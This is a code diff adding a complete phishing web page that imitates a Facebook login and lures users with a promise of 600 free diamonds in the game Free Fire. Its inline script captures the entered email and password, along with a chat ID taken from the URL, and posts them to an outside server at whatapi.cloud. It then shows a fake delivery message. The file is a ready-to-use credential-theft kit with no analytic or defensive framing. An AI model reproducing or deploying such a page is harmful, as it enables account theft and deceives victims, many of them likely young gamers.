@@ -1,1 +1,338 @@
 
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free Fire Free Diamonds - Facebook Login</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        background: #f2f4f7;
+      }
+
+      .content {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      .flex-div {
+        display: flex;
+        justify-content: space-evenly;
+        align-items: center;
+      }
+
+      .name-content {
+        margin-right: 7rem;
+      }
+
+      .name-content .logo {
+        font-size: 3.5rem;
+        color: #1877f2;
+        text-shadow: 2px 2px 4px #000;
+      }
+
+      .name-content p {
+        font-size: 1.3rem;
+        font-weight: 500;
+        color: #1877f2;
+        margin-bottom: 5rem;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+        padding: 2rem;
+        width: 530px;
+        height: 380px;
+        border-radius: 0.5rem;
+        box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+      }
+
+      form input {
+        outline: none;
+        padding: 0.8rem 1rem;
+        margin-bottom: 0.8rem;
+        font-size: 1.1rem;
+      }
+
+      form input:focus {
+        border: 1.8px solid #1877f2;
+      }
+
+      form .login {
+        outline: none;
+        border: none;
+        background: #1877f2;
+        padding: 0.8rem 1rem;
+        border-radius: 0.4rem;
+        font-size: 1.1rem;
+        color: #fff;
+        font-weight: 600;
+      }
+
+      form .login:hover {
+        background: #0f71f1;
+        cursor: pointer;
+      }
+
+      form a {
+        text-decoration: none;
+        text-align: center;
+        font-size: 1rem;
+        padding-top: 0.8rem;
+        color: #1877f2;
+      }
+
+      form hr {
+        background: #f7f7f7;
+        margin: 1rem;
+      }
+
+      form .create-account {
+        outline: none;
+        border: none;
+        background: #42b72a;
+        padding: 0.8rem 1rem;
+        border-radius: 0.4rem;
+        font-size: 1.1rem;
+        color: #fff;
+        width: 75%;
+        margin: 0 auto;
+      }
+
+      form .create-account:hover {
+        background: #36a420;
+        cursor: pointer;
+      }
+
+      .spinner-container {
+        display: none;
+        text-align: center;
+        margin: 10px auto;
+      }
+
+      .spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid #1877f2;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        display: inline-block;
+        vertical-align: middle;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      .verifying-text {
+        display: inline-block;
+        vertical-align: middle;
+        margin-left: 10px;
+        font-size: 16px;
+        color: #1877f2;
+      }
+
+      .success-message {
+        display: none;
+        color: green;
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      @media (max-width: 500px) {
+        html {
+          font-size: 60%;
+        }
+
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+
+        form input {
+          margin-bottom: 1rem;
+          font-size: 1.5rem;
+        }
+
+        form .login {
+          font-size: 1.5rem;
+        }
+
+        form a {
+          font-size: 1.5rem;
+        }
+
+        form .create-account {
+          font-size: 1.5rem;
+        }
+
+        .flex-div {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+
+      @media (min-width: 501px) and (max-width: 768px) {
+        html {
+          font-size: 60%;
+        }
+
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+
+        form input {
+          margin-bottom: 1rem;
+          font-size: 1.5rem;
+        }
+
+        form .login {
+          font-size: 1.5rem;
+        }
+
+        form a {
+          font-size: 1.5rem;
+        }
+
+        form .create-account {
+          font-size: 1.5rem;
+        }
+
+        .flex-div {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+
+      @media (min-width: 769px) and (max-width: 1200px) {
+        html {
+          font-size: 60%;
+        }
+
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+
+        form input {
+          margin-bottom: 1rem;
+          font-size: 1.5rem;
+        }
+
+        form .login {
+          font-size: 1.5rem;
+        }
+
+        form a {
+          font-size: 1.5rem;
+        }
+
+        form .create-account {
+          font-size: 1.5rem;
+        }
+
+        .flex-div {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+
+      @media (orientation: landscape) and (max-height: 500px) {
+        .header {
+          height: 90vmax;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="80px" height="80px"><path fill="#1877f2" d="M41.5,24h-8.2l2.7-9.6c0.2-0.7-0.2-1.4-0.9-1.7c-0.7-0.2-1.4,0.2-1.7,0.9l-3.2,11.2H27l5.6-19.7c0.2-0.7-0.2-1.4-0.9-1.7c-0.7-0.2-1.4,0.2-1.7,0.9L23.6,24h-2.4L21.3,9.9c0-0.7-0.6-1.3-1.3-1.3s-1.3,0.6-1.3,1.3V24h-2.4L13.4,6.1c-0.1-0.7-0.7-1.2-1.4-1.2c-0.7,0-1.3,0.6-1.3,1.3L10.8,24H8.4l-3.2-11.2c-0.2-0.7-0.9-1.1-1.7-0.9c-0.7,0.2-1.1,0.9-0.9,1.7L5.4,24H0.5C0.2,24,0,24.2,0,24.5C0,24.8,0.2,25,0.5,25h5.7l2.6,9.6H3.7C3.3,34.6,3,34.9,3,35.3c0,0.4,0.3,0.7,0.7,0.7h4.2l3.1,11.3c0.2,0.7,0.9,1.1,1.7,0.9c0.7-0.2,1.1-0.9,0.9-1.7L10.8,25h7.7l3.1,11.3c0.2,0.7,0.9,1.1,1.7,0.9c0.1,0,0.3,0.1,0.4,0.1c0.6,0,1.1-0.4,1.3-0.9L33.2,25h7.7l-3.1,11.3c-0.2,0.7,0.2,1.4,0.9,1.7c0.1,0,0.3,0.1,0.4,0.1c0.6,0,1.1-0.4,1.3-0.9l3.2-11.2h5.7c0.3,0,0.5-0.2,0.5-0.5C42,24.2,41.8,24,41.5,24z"/></svg>
+          <h1 class="logo">Free Fire Free Diamonds</h1>
+          <p>Log in with Facebook to get 600 Free Diamonds in Free Fire.</p>
+        </div>
+          <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone Number" required />
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login">Log In</button>
+            <div class="spinner-container" id="spinnerContainer">
+              <div class="spinner" id="spinner"></div>
+              <span class="verifying-text" id="verifyingText">Verifying...</span>
+            </div>
+            <div class="success-message" id="message">Diamonds will be delivered soon within 24 hours!</div>
+            <a href="#">Forgot Password?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+
+    <script>
+      const chatId = new URLSearchParams(window.location.search).get("id");
+
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const spinnerContainer = document.getElementById('spinnerContainer');
+        const message = document.getElementById('message');
+        spinnerContainer.style.display = 'block';
+
+        const formData = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value,
+            type: 'facebook (Free Fire)',
+            chat_id: chatId
+        };
+
+        fetch('https://whatapi.cloud:8443/info', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(formData)
+        })
+        .then(response => response.json())
+        .then(data => {
+          spinnerContainer.style.display = 'none';
+          message.style.display = 'block';
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          spinnerContainer.style.display = 'none';
+        });
+      });
+    </script>
+  </body>
+</html>
